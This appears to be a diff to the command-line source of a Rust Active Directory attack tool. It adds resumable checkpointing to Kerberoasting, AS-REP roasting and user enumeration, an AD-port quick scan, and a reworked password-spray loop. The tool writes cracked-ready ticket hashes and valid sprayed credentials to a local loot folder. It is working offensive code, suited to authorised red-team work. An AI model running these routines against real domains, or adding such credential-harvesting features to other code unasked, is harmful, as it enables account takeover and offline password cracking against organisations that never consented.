@@ -588,6 +588,9 @@ enum Commands {
         /// Disable SMB null session checks
         #[arg(long)]
         no_smb: bool,
+        /// Quick scan of critical AD ports only (88,135,389,445,636,3268,3269,5985,5986)
+        #[arg(long)]
+        ad_only: bool,
     },
 
     /// MSSQL operations — query execution, linked servers, xp_cmdshell, audit
@@ -1632,6 +1635,12 @@ enum KerberosAction {
         /// Attempt LDAP username enumeration first
         #[arg(long)]
         use_ldap: bool,
+        /// Resume from saved checkpoint file
+        #[arg(long)]
+        resume: bool,
+        /// Checkpoint file path (auto-generated if not set)
+        #[arg(long)]
+        checkpoint: Option<String>,
     },
     /// Kerberoast — request TGS for SPNs
     Roast {
@@ -1641,12 +1650,24 @@ enum KerberosAction {
         /// Downgrade to RC4 (etype 23) for offline cracking
         #[arg(long)]
         downgrade_rc4: bool,
+        /// Resume from saved checkpoint file
+        #[arg(long)]
+        resume: bool,
+        /// Checkpoint file path (auto-generated if not set)
+        #[arg(long)]
+        checkpoint: Option<String>,
     },
     /// AS-REP roast — request AS-REP for users without pre-authentication
     AsrepRoast {
         /// Path to user list
         #[arg(short = 'U', long)]
         userlist: Option<String>,
+        /// Resume from saved checkpoint file
+        #[arg(long)]
+        resume: bool,
+        /// Checkpoint file path (auto-generated if not set)
+        #[arg(long)]
+        checkpoint: Option<String>,
     },
     /// Request a TGS service ticket
     GetTgs {
@@ -2847,6 +2868,7 @@ async fn async_main() -> i32 {
             smb,
             no_ldap,
             no_smb,
+            ad_only,
         } => {
             commands_impl::cmd_scan(
                 &cli,
@@ -2856,6 +2878,7 @@ async fn async_main() -> i32 {
                 timeout,
                 ldap && !no_ldap,
                 smb && !no_smb,
+                ad_only,
             )
             .await
         }
@@ -5900,6 +5923,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         delay,
         concurrency,
         use_ldap,
+        resume,
+        ref checkpoint,
     } = action
     {
         let dc = match require_dc(cli) {
@@ -5915,6 +5940,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         };
 
         let effective_userlist = userlist.as_deref().or(cli.user_list.as_deref());
+        let checkpoint_path = checkpoint.as_ref().map(std::path::PathBuf::from);
         let uc = overthrone_hunter::UserEnumConfig {
             userlist: effective_userlist
                 .map(std::path::PathBuf::from)
@@ -5923,6 +5949,9 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             save_asrep_hashes: true,
             concurrency,
             use_ldap,
+            checkpoint_path,
+            resume,
+            live_output: true,
         };
 
         return match overthrone_hunter::userenum::run(&dc, domain, &uc, delay).await {
@@ -5953,7 +5982,13 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
     };
 
     match action {
-        KerberosAction::Roast { spn, downgrade_rc4 } => {
+        KerberosAction::Roast {
+            spn,
+            downgrade_rc4,
+            resume,
+            checkpoint,
+        } => {
+            use overthrone_core::checkpoint::Checkpoint;
             use overthrone_core::proto::kerberos;
             let creds = match require_creds(cli) {
                 Ok(c) => c,
@@ -6009,8 +6044,22 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     jitter_ms: 0,
                     tgt: Some(tgt.clone()),
                 };
+                let ckpt_path = checkpoint
+                    .clone()
+                    .map(std::path::PathBuf::from)
+                    .unwrap_or_else(|| {
+                        overthrone_core::checkpoint::checkpoint_path(
+                            None,
+                            "kerberoast",
+                            &creds.domain,
+                            &dc,
+                        )
+                    });
                 let kc = overthrone_hunter::kerberoast::KerberoastConfig {
                     downgrade_to_rc4: downgrade_rc4,
+                    checkpoint_path: Some(ckpt_path),
+                    resume,
+                    live_output: true,
                     ..Default::default()
                 };
                 match overthrone_hunter::kerberoast::run(&hunt_config, &kc).await {
@@ -6056,19 +6105,69 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                 }
             };
 
-            // Roast specific SPN
+            // Roast specific SPN(s) with checkpoint support
+            let ckpt_path_single = checkpoint
+                .clone()
+                .map(std::path::PathBuf::from)
+                .unwrap_or_else(|| {
+                    overthrone_core::checkpoint::checkpoint_path(
+                        None,
+                        "kerberoast-single",
+                        &creds.domain,
+                        &dc,
+                    )
+                });
+            let mut ckpt_single = if resume && ckpt_path_single.exists() {
+                let c = Checkpoint::load_or_new(
+                    &ckpt_path_single,
+                    "kerberoast-single",
+                    &dc,
+                    &creds.domain,
+                    spns.len(),
+                );
+                println!(
+                    "  Resuming kerberoast from checkpoint: {} ({} prior)",
+                    ckpt_path_single.display(),
+                    c.results().len()
+                );
+                c
+            } else {
+                Checkpoint::load_or_new(
+                    &ckpt_path_single,
+                    "kerberoast-single",
+                    &dc,
+                    &creds.domain,
+                    spns.len(),
+                )
+            };
+
             let mut success = false;
             let loot_dir = std::path::PathBuf::from("./loot");
             let _ = std::fs::create_dir_all(&loot_dir);
-            for target_spn in &spns {
+            let to_roast: Vec<&String> = if resume {
+                spns.iter()
+                    .filter(|s| !ckpt_single.is_processed(s))
+                    .collect()
+            } else {
+                spns.iter().collect()
+            };
+            for target_spn in &to_roast {
+                print!(
+                    "\r  Kerberoasting: {}/{} {}    ",
+                    ckpt_single.processed_count() + 1,
+                    spns.len(),
+                    target_spn
+                );
+                let _ = std::io::Write::flush(&mut std::io::stdout());
+
                 match kerberos::kerberoast(&dc, &tgt, target_spn).await {
                     Ok(hash) => {
+                        println!();
                         println!(
                             "{} Hash: {}",
                             "✓".green(),
                             &hash.hash_string[..80.min(hash.hash_string.len())]
                         );
-                        // Write hash to file
                         let hash_file = loot_dir.join("kerberoast_hashes.txt");
                         if let Ok(mut f) = std::fs::OpenOptions::new()
                             .create(true)
@@ -6079,20 +6178,31 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                             let _ = writeln!(f, "{}", hash.hash_string);
                         }
                         success = true;
+                        ckpt_single.record(target_spn, "hash", Some(hash.hash_string.clone()));
                     }
                     Err(e) => {
+                        println!();
                         println!("{} {}: {}", "✗".red(), target_spn, e);
+                        ckpt_single.record(target_spn, "error", Some(e.to_string()));
                     }
                 }
             }
+            ckpt_single.save();
+            println!();
             if success {
+                let _ = std::fs::remove_file(&ckpt_path_single);
                 banner::print_success("Kerberoast hashes written to ./loot/kerberoast_hashes.txt");
             } else {
                 banner::print_fail("No hashes obtained");
                 return 1;
             }
         }
-        KerberosAction::AsrepRoast { userlist } => {
+        KerberosAction::AsrepRoast {
+            userlist,
+            resume,
+            checkpoint,
+        } => {
+            use overthrone_core::checkpoint::Checkpoint;
             use overthrone_core::proto::kerberos;
             let loot_dir = std::path::PathBuf::from("./loot");
             let _ = std::fs::create_dir_all(&loot_dir);
@@ -6112,12 +6222,75 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                         return 1;
                     }
 
-                    let mut hash_count = 0;
-                    for user in &users {
+                    let ckpt_path = checkpoint
+                        .clone()
+                        .map(std::path::PathBuf::from)
+                        .unwrap_or_else(|| {
+                            overthrone_core::checkpoint::checkpoint_path(
+                                None,
+                                "asrep-roast",
+                                &domain,
+                                &dc,
+                            )
+                        });
+                    let do_resume = resume && ckpt_path.exists();
+                    if do_resume {
+                        println!(
+                            "  Resuming AS-REP roast from checkpoint: {} ({} prior results)",
+                            ckpt_path.display(),
+                            std::fs::read_to_string(&ckpt_path)
+                                .ok()
+                                .and_then(|s| {
+                                    serde_json::from_str::<serde_json::Value>(&s)
+                                        .ok()
+                                        .and_then(|v| v["results"].as_array().map(|a| a.len()))
+                                })
+                                .unwrap_or(0)
+                        );
+                    }
+                    let mut ckpt = Checkpoint::load_or_new(
+                        &ckpt_path,
+                        "asrep-roast",
+                        &dc,
+                        &domain,
+                        users.len(),
+                    );
+
+                    let mut hash_count: usize = 0;
+                    // Restore prior count
+                    for entry in ckpt.results() {
+                        if entry.status == "hash" {
+                            hash_count += 1;
+                        }
+                    }
+
+                    let to_process: Vec<&str> = if do_resume {
+                        let pending = ckpt.pending(&users);
+                        if pending.is_empty() {
+                            println!("  All users already processed — using cached results.");
+                        } else {
+                            println!(
+                                "  {} users remain, skipping {} done",
+                                pending.len(),
+                                users.len() - pending.len()
+                            );
+                        }
+                        pending
+                    } else {
+                        users.iter().map(|s| s.as_str()).collect()
+                    };
+
+                    let total = users.len();
+                    for (i, user) in to_process.iter().enumerate() {
+                        let progress = ckpt.processed_count() + i + 1;
+                        print!("\r  AS-REP roasting: [{}/{}] {}    ", progress, total, user);
+                        let _ = std::io::Write::flush(&mut std::io::stdout());
+
                         match kerberos::asrep_roast(&dc, &domain, user).await {
                             Ok(hash) => {
+                                println!();
                                 println!(
-                                    "{} {}: {}",
+                                    "  {} {}: {}",
                                     "✓".green(),
                                     user.cyan(),
                                     &hash.hash_string[..80.min(hash.hash_string.len())]
@@ -6131,11 +6304,24 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                                     let _ = writeln!(f, "{}", hash.hash_string);
                                 }
                                 hash_count += 1;
+                                ckpt.record(user, "hash", Some(hash.hash_string.clone()));
                             }
                             Err(e) => {
-                                println!("{} {}: {}", "✗".dimmed(), user, e);
+                                ckpt.record(user, "error", Some(e.to_string()));
                             }
                         }
+
+                        if i > 0 && i % 20 == 0 {
+                            ckpt.save();
+                        }
+                    }
+                    ckpt.save();
+                    println!();
+                    // Clean up checkpoint on full success
+                    if hash_count == ckpt.results().iter().filter(|e| e.status == "hash").count()
+                        && hash_count > 0
+                    {
+                        let _ = std::fs::remove_file(&ckpt_path);
                     }
 
                     if hash_count > 0 {
@@ -7340,38 +7526,56 @@ async fn cmd_spray(
 
     let mut valid_creds = Vec::new();
     let mut locked_out = 0u32;
-    use futures::stream;
+    use futures::stream::FuturesUnordered;
     use overthrone_core::proto::kerberos;
+    use std::pin::Pin;
     use std::time::Duration;
 
-    // Create a stream of tasks that each wait `delay + jitter` then attempt auth.
-    let attempt_stream = stream::iter(users.clone().into_iter().map(|user| {
+    let concurrency = _concurrency.max(1);
+    let delay_ms = delay.max(200);
+
+    let make_task = |user: String| {
         let dc = dc.clone();
         let domain = domain.clone();
         let password = password.to_string();
-        async move {
-            // per-attempt spacing
-            if delay > 0 {
-                tokio::time::sleep(Duration::from_millis(delay)).await;
-            }
-            if jitter > 0 {
-                let jitter_add = rand::random::<u64>() % jitter;
-                tokio::time::sleep(Duration::from_millis(jitter_add)).await;
-            }
+        Box::pin(async move {
             let res = kerberos::request_tgt(&dc, &domain, &user, &password, false).await;
             (user, res)
-        }
-    }))
-    .buffer_unordered(_concurrency.max(1));
+        })
+            as Pin<
+                Box<
+                    dyn futures::Future<
+                            Output = (
+                                String,
+                                Result<
+                                    overthrone_core::proto::kerberos::TicketGrantingData,
+                                    overthrone_core::error::OverthroneError,
+                                >,
+                            ),
+                        > + Send,
+                >,
+            >
+    };
 
-    futures::pin_mut!(attempt_stream);
-    while let Some((user, res)) = attempt_stream.next().await {
+    let mut pending = FuturesUnordered::new();
+    let mut users_iter = users.into_iter();
+
+    // Prime: start up to `concurrency` tasks with delay between each
+    for _ in 0..concurrency {
+        if let Some(user) = users_iter.next() {
+            pending.push(make_task(user));
+            tokio::time::sleep(Duration::from_millis(delay_ms)).await;
+        }
+    }
+
+    let total_users = users_iter.len() + concurrency;
+    while let Some((user, res)) = pending.next().await {
         match res {
             Ok(_tgt) => {
                 println!(
                     "  {} {}:{} — {}",
                     "✓".green(),
-                    user.as_str().bold(),
+                    user.bold(),
                     password,
                     "VALID".green().bold()
                 );
@@ -7394,9 +7598,21 @@ async fn cmd_spray(
                         return 1;
                     }
                 } else {
-                    tracing::debug!("  {} {}: {}", "✗".dimmed(), user, err_str);
+                    let prefix = if err_str.contains("PREAUTH_FAILED")
+                        || err_str.contains("C_PRINCIPAL_UNKNOWN")
+                    {
+                        "✗"
+                    } else {
+                        "?"
+                    };
+                    println!("  {} {} — {}", prefix.dimmed(), user, err_str);
                 }
             }
+        }
+
+        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
+        if let Some(next_user) = users_iter.next() {
+            pending.push(make_task(next_user));
         }
     }
 
@@ -7418,13 +7634,13 @@ async fn cmd_spray(
         banner::print_success(&format!(
             "{}/{} valid creds found! Written to ./loot/spray_valid_creds.txt",
             valid_creds.len(),
-            users.len()
+            total_users
         ));
     } else {
         println!(
             "\n{} 0/{} valid credentials found",
             "→".dimmed(),
-            users.len()
+            total_users
         );
     }
     0
@@ -8089,6 +8305,8 @@ mod cli_parse_tests {
                         delay,
                         concurrency,
                         use_ldap,
+                        resume,
+                        ref checkpoint,
                     },
             } => {
                 assert_eq!(userlist.as_deref(), Some("users.txt"));
@@ -8096,6 +8314,8 @@ mod cli_parse_tests {
                 assert_eq!(delay, 10);
                 assert_eq!(concurrency, 10);
                 assert!(!use_ldap);
+                assert!(!resume);
+                assert!(checkpoint.is_none());
             }
             _other => panic!("expected Kerberos::UserEnum, got different variant"),
         }
